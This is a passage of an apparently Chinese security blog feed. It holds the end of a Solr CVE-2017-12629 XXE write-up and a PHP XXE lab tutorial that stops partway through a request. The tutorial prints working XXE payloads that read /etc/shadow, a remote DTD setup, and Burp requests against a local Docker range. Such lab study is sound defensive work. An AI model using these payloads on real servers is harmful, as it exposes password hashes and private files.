&lt;td&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Apache Solr &amp;lt; 7.1.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;利用方式&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;远程 DTD + 外带攻击&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;关键点&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;defType=xmlparser&lt;/code&gt; 触发 XML 解析&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;测试平台&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Vulhub + Kali Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;危害&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;敏感文件读取、内网探测&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;Apache Solr CVE-2017-12629 XXE 漏洞展示了 XML 解析器开放外部实体解析的严重安全隐患。虽然利用过程因无回显和网络限制较为复杂，但通过远程 DTD 和外带技术，攻击者可成功读取目标服务器的敏感文件（如 &lt;code&gt;/etc/passwd&lt;/code&gt;）。开发者应及时升级 Solr 版本、禁用不安全的解析器、限制出站请求，并配合 WAF 和日志监控，构建多层次防御体系。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;“渗透测试的艺术在于：构造、验证、提权、保持优雅”&lt;/p&gt;
</content>
        <category term="Web安全" />
        <category term="Solr" />
        <category term="XXE" />
        <category term="漏洞复现" />
        <category term="Vulhub" />
        <category term="Kali" />
        <updated>2025-08-01T09:54:17.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/07/29/PHP-XXE-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86/</id>
        <title>PHP XXE 漏洞利用与原理</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/29/PHP-XXE-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86/"/>
        <content type="html">&lt;h1 id=&#34;PHP-XXE-漏洞利用与原理&#34;&gt;&lt;a href=&#34;#PHP-XXE-漏洞利用与原理&#34; class=&#34;headerlink&#34; title=&#34;PHP XXE 漏洞利用与原理&#34;&gt;&lt;/a&gt;PHP XXE 漏洞利用与原理&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;&lt;a href=&#34;#引言&#34; class=&#34;headerlink&#34; title=&#34;引言&#34;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;XML External Entity Injection（XXE）是一种针对 XML 解析器的安全漏洞，广泛存在于处理 XML 输入的 Web 应用中。PHP 应用若使用不安全的 XML 解析配置，可能导致攻击者通过构造恶意 XML 载荷读取敏感文件、发起 SSRF（服务器端请求伪造）或执行其他恶意操作。本文将详细讲解 PHP XXE 漏洞的原理、利用步骤、靶场环境搭建，以及防护建议，旨在帮助读者深入理解并有效应对此类漏洞。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;一、XXE-漏洞简介&#34;&gt;&lt;a href=&#34;#一、XXE-漏洞简介&#34; class=&#34;headerlink&#34; title=&#34;一、XXE 漏洞简介&#34;&gt;&lt;/a&gt;一、XXE 漏洞简介&lt;/h2&gt;&lt;p&gt;XXE（XML External Entity Injection）漏洞发生在 XML 解析器处理外部实体时，若未正确配置，允许攻击者通过恶意 XML 输入加载外部实体，从而执行文件读取、SSRF 或其他攻击。PHP 环境中，常见于使用 &lt;code&gt;libxml2&lt;/code&gt; 库（如 &lt;code&gt;SimpleXMLElement&lt;/code&gt; 或 &lt;code&gt;DOMDocument&lt;/code&gt;）解析 XML 时，未禁用外部实体解析。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;危害&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读取服务器本地文件（如 &lt;code&gt;/etc/passwd&lt;/code&gt;、&lt;code&gt;/etc/shadow&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;发起 SSRF，访问内网资源。&lt;/li&gt;
&lt;li&gt;在特定条件下，可能导致拒绝服务（DoS）或远程代码执行（RCE）。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;二、漏洞原理&#34;&gt;&lt;a href=&#34;#二、漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;二、漏洞原理&#34;&gt;&lt;/a&gt;二、漏洞原理&lt;/h2&gt;&lt;p&gt;XXE 漏洞的核心在于 XML 解析器对外部实体（External Entities）的处理。XML 支持通过 &lt;code&gt;&amp;lt;!ENTITY&amp;gt;&lt;/code&gt; 定义实体，实体可以引用本地文件或远程资源。如果解析器未限制外部实体加载，攻击者可通过以下方式触发漏洞：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;构造恶意 XML 载荷&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;使用 &lt;code&gt;&amp;lt;!DOCTYPE&amp;gt;&lt;/code&gt; 和 &lt;code&gt;&amp;lt;!ENTITY&amp;gt;&lt;/code&gt; 定义外部实体，指向本地文件（如 &lt;code&gt;file:///etc/shadow&lt;/code&gt;）或远程资源。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;示例：&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!DOCTYPE a [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;  &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;hljs-keyword&#34;&gt;aaa&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file:///etc/shadow&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;&amp;amp;aaa;&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;服务器解析 XML&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器使用不安全的 XML 解析器（如 PHP 的 &lt;code&gt;DOMDocument&lt;/code&gt;）处理输入。&lt;/li&gt;
&lt;li&gt;解析器加载外部实体，将文件内容替换到实体引用（如 &lt;code&gt;&amp;amp;aaa;&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;信息泄露或进一步攻击&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;解析器回显实体内容（如 &lt;code&gt;/etc/shadow&lt;/code&gt;），导致敏感信息泄露。&lt;/li&gt;
&lt;li&gt;若支持远程实体，可加载攻击者控制的 DTD 文件，触发 SSRF 或更复杂攻击。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;关键条件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器允许外部实体解析（PHP 默认未禁用 &lt;code&gt;libxml2&lt;/code&gt; 的外部实体）。&lt;/li&gt;
&lt;li&gt;应用直接处理用户提交的 XML 输入。&lt;/li&gt;
&lt;li&gt;解析结果可能被回显或以某种方式暴露。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;三、靶场环境准备&#34;&gt;&lt;a href=&#34;#三、靶场环境准备&#34; class=&#34;headerlink&#34; title=&#34;三、靶场环境准备&#34;&gt;&lt;/a&gt;三、靶场环境准备&lt;/h2&gt;&lt;p&gt;以下是复现 PHP XXE 漏洞的环境搭建步骤，基于提供的靶场要求：&lt;/p&gt;
&lt;h3 id=&#34;环境要求&#34;&gt;&lt;a href=&#34;#环境要求&#34; class=&#34;headerlink&#34; title=&#34;环境要求&#34;&gt;&lt;/a&gt;环境要求&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：Kali Linux（IP：192.168.56.102，仅主机网卡）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;靶场地址&lt;/strong&gt;：&lt;code&gt;http://192.168.56.102:8080/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;工具&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;Burp Suite：抓包与修改 HTTP 请求&lt;/li&gt;
&lt;li&gt;Firefox 浏览器：设置代理到 Burp Suite（127.0.0.1:8080）&lt;/li&gt;
&lt;li&gt;Python HTTP 服务（可选）：托管远程 DTD 文件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;前提&lt;/strong&gt;：已完成《php xxe漏洞靶场搭建.docx》中的搭建步骤，靶场运行正常。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;快速验证靶场&#34;&gt;&lt;a href=&#34;#快速验证靶场&#34; class=&#34;headerlink&#34; title=&#34;快速验证靶场&#34;&gt;&lt;/a&gt;快速验证靶场&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;启动靶场：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose up -d&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;确认靶场可访问：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 Firefox 浏览器中访问 &lt;code&gt;http://192.168.56.102:8080/dom.php&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;若页面正常加载，靶场搭建成功。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;配置 Burp Suite 和 Firefox：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;启动 Burp Suite，启用 Proxy 模块，默认监听 &lt;code&gt;127.0.0.1:8080&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;在 Firefox 中设置手动代理，指向 &lt;code&gt;127.0.0.1:8080&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;（可选）准备远程 DTD 服务：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在 Kali 上启动 Python HTTP 服务：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;python3 -m http.server 80&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;将 &lt;code&gt;test.dtd&lt;/code&gt; 放入 HTTP 服务根目录，内容如下：&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;hljs-keyword&#34;&gt;aaa&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file:///etc/shadow&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;四、漏洞利用步骤&#34;&gt;&lt;a href=&#34;#四、漏洞利用步骤&#34; class=&#34;headerlink&#34; title=&#34;四、漏洞利用步骤&#34;&gt;&lt;/a&gt;四、漏洞利用步骤&lt;/h2&gt;&lt;h3 id=&#34;1-启动-Burp-Suite-并抓包&#34;&gt;&lt;a href=&#34;#1-启动-Burp-Suite-并抓包&#34; class=&#34;headerlink&#34; title=&#34;1. 启动 Burp Suite 并抓包&#34;&gt;&lt;/a&gt;1. 启动 Burp Suite 并抓包&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;打开 Burp Suite，确认 Proxy 模块监听 &lt;code&gt;127.0.0.1:8080&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在 Firefox 中访问靶场漏洞页面：&lt;code&gt;http://192.168.56.102:8080/dom.php&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Burp Suite 拦截到以下 GET 请求：&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/dom.php&lt;/span&gt; &lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;192.168.56.102:8080&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;zh-CN,zh;q=0.8&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;右键点击请求，选择 “Send to Repeater” 以便后续修改。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-构造-XXE-Payload&#34;&gt;&lt;a href=&#34;#2-构造-XXE-Payload&#34; class=&#34;headerlink&#34; title=&#34;2. 构造 XXE Payload&#34;&gt;&lt;/a&gt;2. 构造 XXE Payload&lt;/h3&gt;&lt;p&gt;以下是两种常见的 XXE 攻击载荷：&lt;/p&gt;
&lt;h4 id=&#34;Payload-1：读取本地文件（如-etc-shadow）&#34;&gt;&lt;a href=&#34;#Payload-1：读取本地文件（如-etc-shadow）&#34; class=&#34;headerlink&#34; title=&#34;Payload 1：读取本地文件（如 /etc/shadow）&#34;&gt;&lt;/a&gt;Payload 1：读取本地文件（如 &lt;code&gt;/etc/shadow&lt;/code&gt;）&lt;/h4&gt;&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!DOCTYPE a [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;  &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;hljs-keyword&#34;&gt;aaa&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file:///etc/shadow&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;&amp;amp;aaa;&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;说明&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;!ENTITY aaa SYSTEM &amp;quot;file:///etc/shadow&amp;quot;&amp;gt;&lt;/code&gt; 定义了一个外部实体，指向服务器本地文件 &lt;code&gt;/etc/shadow&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a&amp;gt;&amp;amp;aaa;&amp;lt;/a&amp;gt;&lt;/code&gt; 引用实体，解析时会将文件内容替换到 &lt;code&gt;&amp;amp;aaa;&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;Payload-2：远程加载-DTD&#34;&gt;&lt;a href=&#34;#Payload-2：远程加载-DTD&#34; class=&#34;headerlink&#34; title=&#34;Payload 2：远程加载 DTD&#34;&gt;&lt;/a&gt;Payload 2：远程加载 DTD&lt;/h4&gt;&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!DOCTYPE a [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;  &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!ENTITY % y &lt;span class=&#34;hljs-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.102/test.dtd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;  %y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;&amp;amp;aaa;&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;远程&lt;/strong&gt; &lt;code&gt;test.dtd&lt;/code&gt; &lt;strong&gt;内容&lt;/strong&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;hljs-keyword&#34;&gt;aaa&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file:///etc/shadow&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;说明&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;!ENTITY % y SYSTEM &amp;quot;http://192.168.56.102/test.dtd&amp;quot;&amp;gt;&lt;/code&gt; 加载远程 DTD 文件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%y;&lt;/code&gt; 执行 DTD 中的定义，间接加载 &lt;code&gt;/etc/shadow&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;适用于绕过本地实体限制或实现更复杂的攻击。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-发送攻击请求&#34;&gt;&lt;a href=&#34;#3-发送攻击请求&#34; class=&#34;headerlink&#34; title=&#34;3. 发送攻击请求&#34;&gt;&lt;/a&gt;3. 发送攻击请求&lt;/h3&gt;&lt;p&gt;在 Burp Suite 的 Repeater 模块中，构造以下 POST 请求（以 Payload 1 为例）：&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/dom.php&lt;/span&gt; &lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;192.168.56.102:8080&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;*/*&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;application/xml&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;132&lt;br&gt;&lt;br&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!DOCTYPE a [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;  &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;hljs-keyword&#34;&gt;aaa&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span 